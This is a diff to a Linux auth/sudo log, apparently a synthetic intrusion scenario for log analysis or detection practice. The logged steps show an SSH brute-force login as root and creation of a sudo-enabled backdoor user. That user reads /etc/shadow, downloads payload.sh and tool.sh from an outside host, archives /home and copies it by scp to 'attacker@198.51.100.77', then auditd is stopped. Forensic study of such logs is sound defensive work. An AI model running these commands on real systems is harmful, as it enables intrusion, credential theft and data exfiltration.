@@ -11,29 +11,32 @@ Jun 20 08:10:04 server01 sshd[1011]: Failed password for root from 203.0.113.50 
 Jun 20 08:10:07 server01 sshd[1012]: Failed password for root from 203.0.113.50 port 52203 ssh2
 Jun 20 08:10:11 server01 sshd[1013]: Accepted password for root from 203.0.113.50 port 52204 ssh2
 
-Jun 20 08:20:01 server01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
-
-Jun 20 08:20:22 server01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt upgrade
+Jun 20 08:20:01 server01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Jun 20 08:20:22 server01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt upgrade
 
 Jun 20 08:30:01 server01 useradd[1100]: new user: name=backupsvc, UID=1003, GID=1003, home=/home/backupsvc, shell=/bin/bash
 
 Jun 20 08:31:15 server01 passwd[1101]: password changed for backupsvc
 
-Jun 20 08:40:01 server01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backupsvc
+Jun 20 08:40:01 server01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backupsvc
 
-Jun 20 08:45:01 server01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/usermod -aG wheel backupsvc
+Jun 20 08:45:01 server01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/usermod -aG wheel backupsvc
 
-Jun 20 09:00:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Jun 20 09:00:01 server01 sudo: backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
 
-Jun 20 09:05:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd
+Jun 20 09:05:01 server01 sudo: backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd
 
-Jun 20 09:10:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/apt install netcat
+Jun 20 09:10:01 server01 sudo: backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/apt install netcat
 
-Jun 20 09:15:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/apt install nmap
+Jun 20 09:15:01 server01 sudo: backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/apt install nmap
 
-Jun 20 09:20:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.77/payload.sh
+Jun 20 09:20:01 server01 sudo: backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.77/payload.sh
 
-Jun 20 09:25:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.77/tool.sh
+Jun 20 09:25:01 server01 sudo: backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.77/tool.sh
+
+Jun 20 09:27:01 server01 sudo: backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/users.tar.gz /home
+
+Jun 20 09:28:01 server01 sudo: backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/scp /tmp/users.tar.gz attacker@198.51.100.77:/tmp/users.tar.gz
 
 Jun 20 09:30:01 server01 systemd[1]: Stopped auditd.service
 
